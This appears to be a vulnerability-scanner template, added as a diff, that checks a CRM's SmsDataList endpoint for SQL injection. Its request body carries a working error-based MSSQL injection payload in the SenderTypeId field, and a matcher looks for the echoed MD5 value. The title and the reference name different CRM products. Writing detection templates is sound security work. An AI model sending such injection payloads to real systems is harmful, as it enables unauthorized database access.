@@ -1,0 +1,28 @@
+id: crm-smsdatalist-sql
+info:
+  name: 微擎 CRM smsdatalist 接口 - SQL 注入漏洞
+  author: 小r
+  severity: high
+  reference:
+    - https://github.com/PeiQi0/PeiQi-WIKI-Book/blob/32024c5dbb7ff60fa7347cccf6ebb3763a513e7a/docs/wiki/webapp/%E4%BB%BB%E6%88%91%E8%A1%8C/%E4%BB%BB%E6%88%91%E8%A1%8C%20CRM%20SmsDataList%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md?plain=1
+  metadata:
+    verified: true
+    max-request: 1
+    vuln-id: CT-742047
+    vendor: wecrm
+    product: wecrm
+  tags: sqli,vuln,crm,smsdatalist
+variables:
+  s1: '{{rand_int(10000, 99999)}}'
+http:
+  - method: POST
+    path:
+      - '{{BaseURL}}/SMS/SmsDataList/?pageIndex=1&pageSize=30'
+    redirects: false
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: Keywords=&StartSendDate=2020-06-17&EndSendDate=2020-09-17&SenderTypeId=0000000000'%20and%201=convert(int,(sys.fn_sqlvarbasetostr(HASHBYTES('MD5','{{s1}}'))))%20AND%20'CvNI'='CvNI
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200 && contains(to_lower(body), to_lower(md5(to_string(s1)))) && contains(to_lower(body), to_lower("\"message\":"))'
